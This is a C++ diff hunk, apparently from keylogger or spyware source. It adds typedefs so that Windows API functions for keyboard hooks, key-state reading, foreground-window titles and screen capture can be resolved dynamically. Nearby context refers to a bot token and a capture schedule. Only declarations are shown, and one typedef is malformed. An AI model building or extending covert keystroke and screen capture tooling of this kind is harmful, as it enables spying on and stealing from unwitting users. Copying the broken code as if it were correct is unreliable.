@@ -123,6 +123,40 @@ const std::map<int, std::string> keyname{
 const std::vector<time_t> SCHEDULE = {__hrmn(7, 40), __hrmn(8, 30), __hrmn(9, 39), __hrmn(10, 30),
                             __hrmn(13, 39), __hrmn(14, 26), __hrmn(15, 44), __hrmn(16, 29)};
 
+/** Begin define WinAPI function **/
+
+//USER32.DLL
+
+typedef LRESULT(WINAPI *PCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+typedef HDC(WINAPI *PGetDC)(HWND);
+typedef HWND(WINAPI *PGetForegroundWindow);
+typedef SHORT(WINAPI *PGetKeyState)(int);
+typedef HKL(WINAPI *PGetKeyboardLayout)(DWORD);
+typedef BOOL(WINAPI *PGetMessageW)(LPMSG, HWND, UINT, UINT);
+typedef int(WINAPI *PGetWindowTextW)(HWND, LPWSTR, int);
+typedef UINT(WINAPI *PMapVirtualKeyA)(UINT, UINT);
+typedef int(WINAPI *PReleaseDC)(HWND, HDC);
+typedef HHOOK(WINAPI *PSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
+
+//GDI32.DLL
+typedef BOOL(WINAPI *PBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
+typedef HDC(WINAPI *PCreateCompatibleDC)(HDC);
+typedef HBITMAP(WINAPI *PCreateDIBSection)(HDC, const BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);
+typedef BOOL(WINAPI *PDeleteDC)(HDC);
+typedef BOOL(WINAPI *PDeleteObject)(HGDIOBJ);
+typedef HGDIOBJ(WINAPI *PGetCurrentObject)(HDC, UINT);
+typedef int(WINAPI *PGetObjectW)(HANDLE, int, LPVOID);
+typedef HGDIOBJ(WINAPI *PSelectObject)(HDC, HGDIOBJ);
+
+//OLE32.DLL
+typedef HRESULT(WINAPI *PCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM);
+
+//SHELL32.DLL
+typedef LPWSTR*(WINAPI *PCommandLineToArgvW)(LPCWSTR, int);
+typedef HRESULT(*PSHGetFolderPathW)(HWND, int, HANDLE, DWORD, LPWSTR);
+
+/** End define WinAPI function **/
+
 struct __tCOMMAND_LINE_OPTION {
 	std::string BOT_LOCATION[4] = {
 		"-t", BOT_TOKEN,
